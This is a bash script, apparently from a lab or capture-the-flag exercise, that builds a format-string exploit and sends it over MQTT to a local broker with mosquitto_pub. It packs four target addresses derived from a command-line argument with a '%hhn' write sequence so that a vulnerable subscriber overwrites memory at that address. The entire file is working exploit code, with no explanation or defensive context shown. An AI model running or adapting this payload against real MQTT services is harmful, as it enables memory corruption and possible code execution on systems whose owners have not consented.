#!/bin/bash

command_prefix="mosquitto_pub -h 0.0.0.0 -t /topic/qos0 -m"

newline=$(echo "0a0d" | xxd -p -r) # \r\n

msb=$(echo -n $1 | tail -6c) # 3 most significant bytes
lsb=$(echo $1 | head -2c) # least significant bytes
lsb_decimal=$(printf "%d" $((16#$lsb)))

lsb_hex1=$(printf "%.2x" $(($lsb_decimal+1)))
lsb_hex2=$(printf "%.2x" $(($lsb_decimal+2)))
lsb_hex3=$(printf "%.2x" $(($lsb_decimal+3)))

address0=$(echo $1 | xxd -p -r)
address1=$(echo $lsb_hex1$msb | xxd -p -r)
address2=$(echo $lsb_hex2$msb | xxd -p -r)
address3=$(echo $lsb_hex3$msb | xxd -p -r)
addresses=$address0$address1$address2$address3

inject="%50x%6\$hhn%7\$hhn%8\$hhn%9\$hhn"

payload=$addresses$inject

$command_prefix "$payload"